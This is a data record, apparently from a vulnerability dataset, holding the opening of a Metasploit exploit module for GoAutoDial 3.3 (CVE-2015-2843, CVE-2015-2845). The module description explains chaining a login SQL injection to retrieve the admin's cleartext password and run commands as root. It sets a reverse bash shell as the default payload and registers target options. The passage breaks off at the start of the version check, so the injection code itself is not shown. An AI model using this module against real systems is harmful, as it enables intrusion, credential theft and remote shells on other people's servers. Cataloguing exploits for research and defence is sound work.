{
    "text": "vul_name : GoAutoDial 3.3 Authentication Bypass / Command Injection ， vul_cve : CVE-2015-2843 , CVE-2015-2845 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， super ( update_info ( info ,  ， 'Name' => \"GoAutoDial 3.3 Authentication Bypass / Command Injection\" ,  ， 'Description' => %q{ ， This module exploits a SQL injection flaw in the login functionality for GoAutoDial version 3.3-1406088000 and below , and attempts to perform command injection. This also attempts to retrieve the admin user details , including the cleartext password stored in the underlying database. Command injection will be performed with root privileges. The default pre-packaged ISO builds are available from goautodial.org. Currently , the hardcoded command injection payload is an encoded reverse-tcp bash one-liner and the handler should be setup to receive it appropriately. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Chris McCurley' ,  # Discovery & Metasploit module ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2015-2843' ]  ,  ，  [ 'CVE' , '2015-2845' ]  ，  ]  ,  ， 'Platform' => %w{unix} ,  ， 'Arch' => ARCH_CMD ,  ， 'Targets' => [  [ 'Automatic' , {} ]  ]  ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' } ,  ， 'DefaultTarget' => 0 ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => 'Apr 21 2015' )  ， register_options (  ，  [  ， OptPort.new ( 'RPORT' ,  [ true , 'The target port' , 443 ]  )  ,  ， OptBool.new ( 'SSL' ,  [ false , 'Use SSL' , true ]  )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'The base path' , '/' ]  )  ，  ]  )  ， end ， def check ， res = check_version (  ) ",
    "time": "2017.07.05"
}